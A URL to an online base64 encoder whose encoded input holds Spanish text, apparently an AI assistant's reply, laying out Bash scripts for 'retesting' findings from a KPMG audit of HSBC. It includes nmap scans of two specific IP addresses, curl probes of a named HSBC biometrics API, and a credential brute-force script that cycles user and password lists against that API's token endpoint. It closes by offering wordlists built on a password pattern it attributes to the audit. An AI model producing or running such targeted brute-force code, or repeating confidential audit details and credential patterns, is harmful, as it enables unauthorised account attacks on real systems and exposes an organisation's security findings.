+https://emn178.github.io/online-tools/base64_encode.html?input=Para%20automatizar%20el%20**retest**%20y%20las%20pruebas%20de%20seguridad%20interna%20en%20**HSBC**%2C%20he%20dise%C3%B1ado%20esta%20suite%20de%20scripts%20en%20**Bash**.%20Cada%20uno%20est%C3%A1%20alineado%20con%20los%20hallazgos%20t%C3%A9cnicos%20del%20reporte%20de%20**KPMG**.%0A%0A---%0A%0A%23%23%23%201.%20Auditor%C3%ADa%20de%20Hardening%20SSH%20(%60ssh_audit.sh%60)%0A%0AValida%20el%20cumplimiento%20de%20algoritmos%20de%20cifrado%20y%20m%C3%A9todos%20de%20autenticaci%C3%B3n.%0A%0A%60%60%60bash%0A%23!%2Fbin%2Fbash%0A%23%20ssh_audit.sh%20-%20Verifica%20vulnerabilidades%20de%20SSH%20reportadas%0ATARGET%3D%241%0AOUTPUT%3D%22ssh_report_%24%7BTARGET%7D.txt%22%0A%0Aecho%20%22---%20SSH%20AUDIT%20FOR%20%24TARGET%20---%22%20%7C%20tee%20%22%24OUTPUT%22%0A%23%20Verificaci%C3%B3n%20de%20m%C3%A9todos%20de%20autenticaci%C3%B3n%20(Hallazgo%202%20Infra)%0Aecho%20%22%5B*%5D%20Checking%20Auth%20Methods...%22%20%7C%20tee%20-a%20%22%24OUTPUT%22%0Anmap%20-p%2022%20--script%20ssh-auth-methods%20%22%24TARGET%22%20%7C%20tee%20-a%20%22%24OUTPUT%22%0A%0A%23%20Verificaci%C3%B3n%20de%20Algoritmos%20y%20Cifrados%20(Hallazgos%203%2C%204%20y%205%20Infra)%0Aecho%20%22%5B*%5D%20Checking%20Algorithms%20(KEX%2C%20Ciphers%2C%20MACs)...%22%20%7C%20tee%20-a%20%22%24OUTPUT%22%0Anmap%20-p%2022%20--script%20ssh2-enum-algos%20%22%24TARGET%22%20%7C%20tee%20-a%20%22%24OUTPUT%22%0A%0Aecho%20%22Report%20saved%20to%3A%20%24OUTPUT%22%0A%0A%60%60%60%0A%0A---%0A%0A%23%23%23%202.%20Escaneo%20de%20Versiones%20y%20Servicios%20(%60version_checker.sh%60)%0A%0ABusca%20versiones%20obsoletas%20de%20**OpenSSH%207.4**%20y%20**Splunkd%208.1.2**.%0A%0A%60%60%60bash%0A%23!%2Fbin%2Fbash%0A%23%20version_checker.sh%20-%20Detecta%20versiones%20vulnerables%0ATARGETS%3D(%22164.6.33.138%22%20%22164.6.33.183%22)%0AOUTPUT%3D%22version_audit.log%22%0A%0Afor%20IP%20in%20%22%24%7BTARGETS%5B%40%5D%7D%22%3B%20do%0A%20%20%20%20echo%20%22---%20SCANNING%20%24IP%20---%22%20%7C%20tee%20-a%20%22%24OUTPUT%22%0A%20%20%20%20%23%20Escaneo%20de%20versiones%20en%20puertos%20reportados%20(22%20y%208689)%0A%20%20%20%20nmap%20-sV%20-p%2022%2C8689%20%22%24IP%22%20--open%20%7C%20tee%20-a%20%22%24OUTPUT%22%0Adone%0A%0A%60%60%60%0A%0A---%0A%0A%23%23%23%203.%20Auditor%C3%ADa%20de%20API%20y%20Cabeceras%20(%60web_sec_check.sh%60)%0A%0AVerifica%20la%20exposici%C3%B3n%20de%20datos%20en%20el%20endpoint%20%60%2Ftoken%60%20y%20la%20falta%20de%20flags%20en%20cookies.%0A%0A%60%60%60bash%0A%23!%2Fbin%2Fbash%0A%23%20web_sec_check.sh%20-%20Verifica%20Sensitive%20Data%20y%20Security%20Headers%0AURL%3D%22https%3A%2F%2Fbiometrics-fps.oat.mx.hsbc%2Ffpc-api%22%0ALOG%3D%22web_security.txt%22%0A%0Aecho%20%22---%20WEB%20SECURITY%20AUDIT%20---%22%20%7C%20tee%20%22%24LOG%22%0A%23%20Verificaci%C3%B3n%20de%20datos%20sensibles%20en%20respuesta%20(Hallazgo%201%20Web)%0Aecho%20%22%5B*%5D%20Testing%20API%20Sensitive%20Data%20Exposure...%22%20%7C%20tee%20-a%20%22%24LOG%22%0Acurl%20-s%20-X%20POST%20%22%24URL%2Fauth%2Ftoken%22%20-H%20%22Content-Type%3A%20application%2Fjson%22%20%7C%20jq%20'.'%20%7C%20tee%20-a%20%22%24LOG%22%0A%0A%23%20Verificaci%C3%B3n%20de%20Headers%20y%20Cookies%20(Hallazgo%204%20y%205%20Web)%0Aecho%20-e%20%22%5Cn%5B*%5D%20Checking%20Security%20Headers%20%26%20Cookie%20Flags...%22%20%7C%20tee%20-a%20%22%24LOG%22%0Acurl%20-I%20-s%20%22https%3A%2F%2Fbiometrics-fps.oat.mx.hsbc%2Ffpc%2Flogin%22%20%7C%20grep%20-E%20%22Set-Cookie%7CContent-Security-Policy%22%20%7C%20tee%20-a%20%22%24LOG%22%0A%0A%60%60%60%0A%0A---%0A%0A%23%23%23%204.%20Bash%20%22Intruder%22%20Script%20(%60bash_intruder.sh%60)%0A%0AEste%20script%20emula%20los%204%20tipos%20de%20ataque%20de%20**Burp%20Suite%20Intruder**%20para%20pruebas%20internas%20de%20fuerza%20bruta%20o%20inyecci%C3%B3n%20de%20par%C3%A1metros.%0A%0A%60%60%60bash%0A%23!%2Fbin%2Fbash%0A%23%20bash_intruder.sh%20-%20Replicaci%C3%B3n%20de%20funciones%20de%20Burp%20Intruder%0A%0AMODE%3D%241%20%23%20sniper%2C%20battering_ram%2C%20pitchfork%2C%20cluster_bomb%0ATARGET_URL%3D%22https%3A%2F%2Fbiometrics-fps.oat.mx.hsbc%2Ffpc-api%2Fauth%2Ftoken%22%0ALIST1%3D%22users.txt%22%0ALIST2%3D%22passwords.txt%22%0A%0Acase%20%24MODE%20in%0A%20%20%22sniper%22)%0A%20%20%20%20%23%20Un%20solo%20payload%2C%20una%20posici%C3%B3n%20a%20la%20vez%0A%20%20%20%20echo%20%22%5B!%5D%20Mode%3A%20Sniper%22%0A%20%20%20%20for%20payload%20in%20%24(cat%20%24LIST1)%3B%20do%0A%20%20%20%20%20%20%20%20echo%20%22%5B%2B%5D%20Testing%3A%20%24payload%22%0A%20%20%20%20%20%20%20%20curl%20-s%20-X%20POST%20%22%24TARGET_URL%22%20-d%20%22%7B%5C%22user%5C%22%3A%5C%22%24payload%5C%22%2C%5C%22pass%5C%22%3A%5C%22constante%5C%22%7D%22%0A%20%20%20%20done%0A%20%20%20%20%3B%3B%0A%0A%20%20%22battering_ram%22)%0A%20%20%20%20%23%20Un%20solo%20payload%20puesto%20en%20todas%20las%20posiciones%20simult%C3%A1neamente%0A%20%20%20%20echo%20%22%5B!%5D%20Mode%3A%20Battering%20Ram%22%0A%20%20%20%20for%20payload%20in%20%24(cat%20%24LIST1)%3B%20do%0A%20%20%20%20%20%20%20%20echo%20%22%5B%2B%5D%20Testing%3A%20%24payload%20%2F%20%24payload%22%0A%20%20%20%20%20%20%20%20curl%20-s%20-X%20POST%20%22%24TARGET_URL%22%20-d%20%22%7B%5C%22user%5C%22%3A%5C%22%24payload%5C%22%2C%5C%22pass%5C%22%3A%5C%22%24payload%5C%22%7D%22%0A%20%20%20%20done%0A%20%20%20%20%3B%3B%0A%0A%20%20%22pitchfork%22)%0A%20%20%20%20%23%20M%C3%BAltiples%20listas%20en%20paralelo%20(L%C3%ADnea%201%20con%20L%C3%ADnea%201)%0A%20%20%20%20echo%20%22%5B!%5D%20Mode%3A%20Pitchfork%22%0A%20%20%20%20exec%203%3C%24LIST1%0A%20%20%20%20exec%204%3C%24LIST2%0A%20%20%20%20while%20read%20-u%203%20p1%20%26%26%20read%20-u%204%20p2%3B%20do%0A%20%20%20%20%20%20%20%20echo%20%22%5B%2B%5D%20Sync%3A%20%24p1%3A%24p2%22%0A%20%20%20%20%20%20%20%20curl%20-s%20-X%20POST%20%22%24TARGET_URL%22%20-d%20%22%7B%5C%22user%5C%22%3A%5C%22%24p1%5C%22%2C%5C%22pass%5C%22%3A%5C%22%24p2%5C%22%7D%22%0A%20%20%20%20done%0A%20%20%20%20%3B%3B%0A%0A%20%20%22cluster_bomb%22)%0A%20%20%20%20%23%20Producto%20cartesiano%20(Todas%20las%20combinaciones%20posibles)%0A%20%20%20%20echo%20%22%5B!%5D%20Mode%3A%20Cluster%20Bomb%22%0A%20%20%20%20for%20p1%20in%20%24(cat%20%24LIST1)%3B%20do%0A%20%20%20%20%20%20%20%20for%20p2%20in%20%24(cat%20%24LIST2)%3B%20do%0A%20%20%20%20%20%20%20%20%20%20%20%20echo%20%22%5B%2B%5D%20Combo%3A%20%24p1%3A%24p2%22%0A%20%20%20%20%20%20%20%20%20%20%20%20curl%20-s%20-X%20POST%20%22%24TARGET_URL%22%20-d%20%22%7B%5C%22user%5C%22%3A%5C%22%24p1%5C%22%2C%5C%22pass%5C%22%3A%5C%22%24p2%5C%22%7D%22%0A%20%20%20%20%20%20%20%20done%0A%20%20%20%20done%0A%20%20%20%20%3B%3B%0A%0A%20%20*)%0A%20%20%20%20echo%20%22Usage%3A%20.%2Fbash_intruder.sh%20%5Bsniper%7Cbattering_ram%7Cpitchfork%7Ccluster_bomb%5D%22%0A%20%20%20%20%3B%3B%0Aesac%0A%0A%60%60%60%0A%0A---%0A%0A%23%23%23%20%F0%9F%93%8B%20Resumen%20de%20Archivos%20de%20Salida%0A%0A%7C%20Script%20%7C%20Salida%20en%20Pantalla%20%7C%20Archivo%20de%20Salida%20%7C%0A%7C%20---%20%7C%20---%20%7C%20---%20%7C%0A%7C%20%60ssh_audit.sh%60%20%7C%20Logs%20de%20Nmap%20detallados%20%7C%20%60ssh_report_%5BIP%5D.txt%60%20%7C%0A%7C%20%60version_checker.sh%60%20%7C%20Versiones%20de%20servicios%20%7C%20%60version_audit.log%60%20%7C%0A%7C%20%60web_sec_check.sh%60%20%7C%20JSON%20de%20API%20y%20Headers%20%7C%20%60web_security.txt%60%20%7C%0A%7C%20%60bash_intruder.sh%60%20%7C%20Status%20de%20cada%20petici%C3%B3n%20%7C%20Salida%20est%C3%A1ndar%20(redirigible%20a%20log)%20%7C%0A%0A**Siguiente%20paso%20recomendado%3A**%0A%C2%BFTe%20gustar%C3%ADa%20que%20cree%20los%20**archivos%20de%20payloads**%20(%60users.txt%60%20y%20%60passwords.txt%60)%20con%20los%20nombres%20de%20usuario%20y%20patrones%20de%20contrase%C3%B1as%20(como%20%60Metris05%60)%20que%20KPMG%20identific%C3%B3%20en%20su%20reporte%3F.&input_type=utf-8&format=rfc_4648
